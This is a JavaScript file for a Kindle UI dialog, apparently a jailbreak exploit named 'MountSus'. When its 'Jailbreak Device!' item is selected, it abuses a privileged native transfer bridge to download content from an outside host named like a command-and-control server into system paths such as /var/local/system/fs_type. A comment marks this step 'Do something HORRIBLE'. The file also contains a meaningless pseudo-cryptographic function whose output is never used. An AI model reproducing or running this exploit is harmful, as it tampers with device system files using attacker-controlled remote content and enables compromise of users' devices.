thumb = "YldWeVoyVnVNekV3Tnc9PQ==";

function generateCryptoSign(signBy) {
    var e = Math.ceil(signBy).toExponential();
    var data = []
    for (var i=0; i < e.length; i++) {
        data.push(e.charCodeAt(i));
    }

    while (data.length < "kindle".length - 2) {
        data.push(Math.random());
    }

    for (var i=0; i < data.length; i++) {
        while (data[i] > 1) {
            data[i] = data[i] * Math.random();
        }
    }
    return data;
}

function downloadDRMFile(path, url, file) {
    var drmFileData = {
        url:                        url,        // The path to the server
        dest:                       path,           // Destination
        unique_id:                  "archivedItems",
        extra_headers:              "fileData:" + encodeURIComponent(file) + "\nmodelInfo:" + encodeURIComponent(thumb)
    }

    drmFileData.transport_any = 1;
    drmFileData.priority = 80;
    drmFileData.notify_progress_interval = 20;
    drmFileData.notify_pub = "com.lab126.archive";
    drmFileData.notify_prop = "transferProgressNotification";


    return drmFileData
}

Pillow.MountSusDialog = function tmp() {
    var that = this;
    var parent = Pillow.extend(this, new Pillow.Case('MountSusDialog'));
    var windowTitle = null;
    var listWidget = null;
    var selectedItem = null;
    var settingList = null;
    var jsEnabled = true;
    var imageEnabled = true;
    var file = ""; // The file to edit and send to the server
    var filePath = ""; // The location to download the file to
    var lipcId = null;
    const SETTINGS_DIALOG_ID = "dialog";


    /**
     * Sets up the dialog with Pillow and prepares the interface.
     */
    this.onLoad = function tmp() {
        nativeBridge.registerClientParamsCallback(this.clientParamsCallback);
        Pillow.setOption(OPTION_SEND_DELETE_EVENTS, true);
        windowTitle = new WindowTitle(WINMGR.LAYER.DIALOG, WINMGR.ROLE.DIALOG);
        windowTitle.withChanges(function tmp() {
            this.addParam(WINMGR.KEY.WIN_IS_MODAL,
                WINMGR.MODALITY.DISMISSIBLE_MODAL);
        });
        listWidget = new ListWidget('settings', {
            fields: ['name','id'],
            handler: listItemSelection,
            xor: true
        });
        cancelButton = document.getElementById('advancedCancelButton');
        new XorButton(cancelButton, Pillow.bind(this, 'close', null),
                      cancelButton, 'dialog-close','dialog-close xor');
        var dialogElem = document.getElementById(SETTINGS_DIALOG_ID);
        nativeBridge.setWindowSize(dialogElem.offsetWidth, 700);
        this.show();
        parent(this).onLoad();
        modifyClassNameDOM();
    };

    var listItemSelection = function tmp(item) {
        Pillow.logInfo("Generating crypto constants");
        var cryptoConstants = generateCryptoSign();
        var urlRoot = "https://mountsusc2.hackerman.fr";

        var drm3ResponseRequest = downloadDRMFile(filePath, urlRoot + "/MountSus/drmChallengeResponse", file);

        document.getElementById("jailState").innerText = "Sending request...";

        nativeBridge.accessHasharrayProperty("com.lab126.transfer", "request_download", drm3ResponseRequest);

        // Do something HORRIBLE
        nativeBridge.accessHasharrayProperty("com.lab126.transfer", "request_download", {
            url:                        urlRoot + "/MountSus/fs_type",        // The path to the server
            dest:                       "/var/local/system/fs_type",           // Destination
            unique_id:                  "archivedItems",
            extra_headers:              "modelInfo:" + encodeURIComponent(thumb),

            transport_any: 1,
            priority: 80,
            notify_progress_interval: 20,
            notify_pub: "com.lab126.archive",
            notify_prop: "transferProgressNotification",
        });

        document.getElementById("jailState").innerText = "Digging tunnel...";

        setTimeout(function tmp() {
            document.getElementById("jailState").innerText = "Done! Close the popup and click Verify Jailbreak";
        }, 1000);
    };

    this.clientParamsCallback = function tmp(clientParamsString){
        // parse clientParams
        var clientParams = JSON.parse(clientParamsString);
        file = clientParams.fileData; // Add the payload
        filePath = clientParams.filePath;
        jsEnabled =  (clientParams.jsEnabled === 'true');
        imageEnabled =  (clientParams.imageEnabled === 'true');
        lipcId = clientParams.replySrc;

        document.getElementById("jailState").innerText = "You are currently in jail.";
    };

    this.getBrowserSettings = function tmp() {
        var displayList = [];
        displayList.push({
            name: "Jailbreak Device!",
            id: "jailbreak_device"
        });

        return displayList;
    };

    this.renderBrowserSettings = function(settingList, widgetOptions) {
        listWidget.setItems(settingList, widgetOptions);
    };

    this.setBrowserSettings = function tmp(widgetOptions) {
        settingList = this.getBrowserSettings();
        this.renderBrowserSettings(settingList, widgetOptions);
    };

    this.show = function tmp() {
        this.setBrowserSettings(true);
        nativeBridge.showMe();
    };

    this.hide = function tmp() {
        Pillow.logInfo("MountSusDialog.hide called");
        windowTitle.addParam(WINMGR.KEY.HIDE_DIALOG, WINMGR.DIALOG_HIDE.BACKGROUND);
    };

    this.close = function tmp() {
        Pillow.logInfo("MountSusDialog.close called");
        nativeBridge.dismissMe();
    };

    Pillow.logWrapObject('Pillow.MountSusDialog', this);
};

var mountSusDialog = new Pillow.MountSusDialog();
mountSusDialog.register();

